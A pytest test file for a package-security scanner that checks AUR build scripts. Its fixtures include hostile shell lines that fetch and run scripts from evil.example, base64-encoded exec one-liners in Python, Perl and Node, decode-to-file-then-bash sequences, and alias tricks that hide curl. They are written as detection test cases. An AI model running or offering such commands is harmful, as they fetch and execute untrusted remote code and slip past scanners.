"""The decoder alphabet, the write tracker, and the alias that renamed both."""

import pytest

from .helpers import _fires

# ---------------------------------------------------------------------------
# Audit v3/v4 - the decoder alphabet and the write tracker each had one
# spelling, and a different spelling of the same operation was free
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("reader", [
    "unzip -p p.zip", "funzip p.zip", "ar p p.a member.sh", "unrar p p.rar f.sh",
    "gpg -d p.gpg", "gpg --decrypt p.gpg", "bsdtar -xOf p.zip f",
])
def test_an_archive_read_to_stdout_and_run_is_a_decode(reader):
    """`unzip -p p.zip | bash` is `gzip -dc p.gz | bash` with a different verb."""
    assert "X001" in _fires([f"  {reader} | bash"]), reader


def test_basenc_flag_order_is_not_an_escape():
    """`basenc --alg -d` and `basenc -d --alg` are the same command."""
    assert "X001" in _fires(["  basenc --base64url -d p | bash"])
    assert "X001" in _fires(["  basenc -d --base64url p | bash"])


@pytest.mark.parametrize("write", [
    "openssl enc -d -aes-256-cbc -in p.enc -out s.sh",
    "openssl base64 -d -in p.b64 -out s.sh",
    "gpg -d -o s.sh p.gpg",
    "gpg --decrypt --output s.sh p.gpg",
    "dd if=p.dat of=s.sh",
    "dd of=s.sh if=p.dat",
    "gzip -dc p.gz > s.sh",
    "funzip p.zip > s.sh",
    "xxd -r -p p.hex > s.sh",
    "unzip -p p.zip > s.sh",
    "python3 -c \"open('s.sh','w').write(open('p','rb').read())\"",
    "node -e 'require(\"fs\").writeFileSync(\"s.sh\", d)'",
])
def test_a_decoded_file_is_a_tracked_write(write):
    """The tracker knew `cat`, `tee`, `printf`, `echo` and shell redirects.

    Every other way of putting decoded bytes in a file - an output *flag*,
    a redirect from a decompressor, an interpreter one-liner - left the
    write unseen, so the `bash s.sh` on the next line paired with nothing.
    `dd of=X if=Y` failed for a third reason: the destination was read as
    the last token on the line.
    """
    assert "H069" in _fires([f"  {write}", "  bash s.sh"]), write


@pytest.mark.parametrize("ordinary", [
    "make > build.log",
    "gcc -o out main.c",
    "install -o root -m755 f /usr/bin/f",
    "python3 -c 'print(1)'",
    "tar -xzf src.tar.gz -C build",
])
def test_ordinary_writes_are_not_payload_writes(ordinary):
    """The producer list is the decoder alphabet, not "any command".

    `-o` in particular is overloaded: `gcc -o` is an output but `install -o
    root` names an owner, which is why the arm enumerates its commands.
    """
    assert "H069" not in _fires([f"  {ordinary}", "  bash s.sh"]), ordinary


@pytest.mark.parametrize("fetch", [
    "curl -o f https://evil.example/x", "curl -Lo f https://evil.example/x",
    "wget -O f https://evil.example/x", "wget -qO f https://evil.example/x",
])
def test_a_clustered_output_flag_still_pairs_with_the_execution(fetch):
    """`-o` is rarely alone: `curl -Lo` and `wget -qO` are what people type."""
    assert "H082" in _fires([f"  {fetch}", "  bash f"], declared=False), fetch


@pytest.mark.parametrize("payload", [
    "python3 -c 'exec(__import__(\"base64\").b64decode(\"{b}\"))'",
    "perl -MMIME::Base64 -e 'eval(MIME::Base64::decode_base64(\"{b}\"))'",
    "node -e 'eval(atob(\"{b}\"))'",
])
def test_an_interpreter_that_decodes_and_executes_inline_fires(payload):
    """No pipe to anchor on and no shell word to read: both are inside the
    quoted script, which is the point of writing it this way."""
    import base64

    blob = base64.b64encode(b"curl https://evil.example/x | bash\n" * 3).decode()
    assert "X001" in _fires([f"  {payload.format(b=blob)}"])


def test_an_interpreter_running_an_ordinary_script_is_silent():
    assert "X001" not in _fires(["  python3 -c 'print(1)'"])
    assert "X001" not in _fires(["  perl -MFoo -e 'print 1'"])


def test_a_committed_configure_is_not_a_benign_build_artifact():
    """The exemption claims "this is the project's own build flow".

    That claim is about where the file came from, not what it is called: a
    `configure` committed to the AUR repository and named in no `source=()`
    is the maintainer's script, and `./configure` runs it.
    """
    manifest = [("PKGBUILD", b"x"), ("configure", b"#!/bin/sh\ncurl evil | sh\n")]
    assert "H081" in _fires(['  cd "$srcdir"', "  ./configure"], manifest=manifest)


def test_a_tarball_configure_stays_exempt():
    """An autotools `configure` from the extracted tarball is ordinary."""
    assert "H081" not in _fires(
        ['  cd "$srcdir/p-1.0"', "  ./configure"], manifest=[("PKGBUILD", b"x")],
    )


# ---------------------------------------------------------------------------
# Audit v5 E9 - an alias is a rename, and every fetch rule keys on the name
#
# `alias dl='curl -fsSL'` removes the downloader from R001, R010, H016 and
# H082 at once while bash runs the identical pipeline.  The variable form
# (`CMD=curl; $CMD ...`) was already resolved, so leaving aliases alone made
# the harder-to-read spelling the safer one.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("alias_line,use", [
    ("alias dl='curl -fsSL'", "dl https://evil.example/x.sh | bash"),
    ("alias cc='curl -fsSL'", "cc https://evil.example/x.sh | bash"),
    ('alias dl="curl -fsSL"', "dl https://evil.example/x.sh | bash"),
    ("alias a='curl'", "a -fsSL https://evil.example/x.sh | bash"),
])
def test_an_aliased_downloader_is_resolved(alias_line, use):
    assert "R001" in _fires([f"  {alias_line}", f"  {use}"], declared=False)


def test_an_alias_chain_resolves():
    """An alias may be written in terms of another; bash resolves at use."""
    fired = _fires([
        "  alias fetch='curl -fsSL'",
        "  alias dl='fetch'",
        "  dl https://evil.example/x.sh | bash",
    ], declared=False)
    assert "R001" in fired


def test_an_alias_name_in_argument_position_is_not_expanded():
    """Bash expands an alias only as the first word of a simple command.

    Expanding it anywhere else would invent text the shell never produces,
    which is how a rule starts firing on something that does not happen.
    """
    from trustsight.tokenizer import _alias_table, _expand_aliases

    table = _alias_table(["alias dl='curl -fsSL'"])
    assert _expand_aliases("echo dl", table) == "echo dl"
    assert _expand_aliases("cp dl /tmp", table) == "cp dl /tmp"
    assert _expand_aliases("dl x", table) == "curl -fsSL x"
    assert _expand_aliases("false; dl x", table) == "false; curl -fsSL x"


def test_both_resolvers_expand_aliases():
    """Two parallel resolvers feed different rules; one alone is the bug."""
    from trustsight.tokenizer import (
        resolve_added_lines, tokenize_and_resolve_indexed,
    )

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,8 @@\n"
        "+build() {\n+  alias dl='curl -fsSL'\n"
        "+  dl https://evil.example/x.sh | bash\n+}\n"
    )
    assert any("curl -fsSL https" in ln for ln in resolve_added_lines(diff))
    resolved, _unresolved, _idx = tokenize_and_resolve_indexed(diff)
    assert any("curl -fsSL https" in ln for ln in resolved)


# ---------------------------------------------------------------------------
# A stale rules.toml costs detection, and only one command said so
# ---------------------------------------------------------------------------


def test_status_reports_stale_rule_patterns():
    from trustsight.cli.admin import _stale_rules_note

    note = _stale_rules_note(["R001"], [])
    assert "R001" in note
    assert "detect less" in note
    assert "sync-rules" in note
